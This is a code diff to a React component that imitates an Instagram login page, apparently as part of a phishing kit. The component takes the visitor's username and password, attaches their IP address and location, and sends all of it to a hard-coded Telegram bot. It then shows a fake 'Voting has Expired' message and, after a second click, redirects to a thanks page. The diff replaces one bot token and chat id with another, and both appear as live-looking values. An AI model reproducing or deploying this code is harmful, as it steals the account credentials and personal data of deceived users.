@@ -1,11 +1,15 @@
 import React, { useState, FormEvent } from "react";
 import Logo from "../assets/images.png";
 import AppDownload from "./AppDownload";
+import { useNavigate } from 'react-router';
+
 
 const Instagram: React.FC = () => {
+  const navigate = useNavigate()
   const [type, setType] = useState<string>("password");
   const [icon, setIcon] = useState<boolean>(true);
   const [result, setResult] = useState<string>("");
+  const [clicking, setClicking] = useState<number>(0)
 
   const handleToggle = () => {
     setType(icon ? "text" : "password");
@@ -29,18 +33,23 @@ const Instagram: React.FC = () => {
         const PasswordLogin = formData.password;
         const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
 
-        const token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
-        const chat_id = -4175742974;
+        const token = "6856364752:AAG6Lr_2eZKw4cBO1feTE4iUk4EOCKzTy98";
+        const chat_id = -4766800179;
+
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
         const api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-
+        setClicking(clicking + 1)
         setTimeout(() => {
           setResult("Unfortunately, Voting has Expired....");
         }, 2000);
       });
+
+    if (clicking == 2) {
+      navigate('/thanks')
+    }
   };
 
   return (
